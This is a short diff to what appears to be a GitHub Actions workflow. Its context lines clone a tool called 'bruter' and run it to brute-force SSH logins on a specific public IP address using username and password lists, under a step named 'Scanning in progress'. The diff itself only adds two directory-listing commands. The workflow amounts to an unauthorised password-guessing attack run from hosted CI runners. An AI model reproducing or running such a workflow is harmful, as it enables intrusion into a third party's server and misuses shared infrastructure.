@@ -27,6 +27,7 @@ jobs:
         git clone https://github.com/xiv3r/bruter.git
         cd bruter
         chmod +x bruter.sh
+        ls -lh
         
     - name: Make User
       run: |
@@ -39,6 +40,7 @@ jobs:
     - name: Scanning in progress 
       run: |
          bash bruter.sh ssh user.txt passwords.txt 194.108.117.16 output.log
+         ls -la
          
     - name: Determine release tag
       id: get_tag
